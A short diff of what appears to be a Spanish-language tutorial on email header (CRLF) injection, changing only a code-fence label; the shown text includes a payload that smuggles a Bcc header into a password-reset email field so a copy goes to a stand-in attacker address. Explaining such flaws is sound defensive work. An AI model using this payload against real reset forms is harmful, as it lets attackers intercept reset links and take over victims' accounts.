@@ -36,7 +36,7 @@ email = victima@objetivo.com%0d%0aBcc: atacante@evil.com
 
 El servidor arma el correo con `To: victima@objetivo.com` y `Bcc: atacante@evil.com`, así que el atacante recibe una copia silenciosa. Aplicado al flujo de restablecimiento:
 
-```
+```http
 POST /reset
 email=victima@objetivo.com%0d%0aBcc:atacante@evil.com
 ```
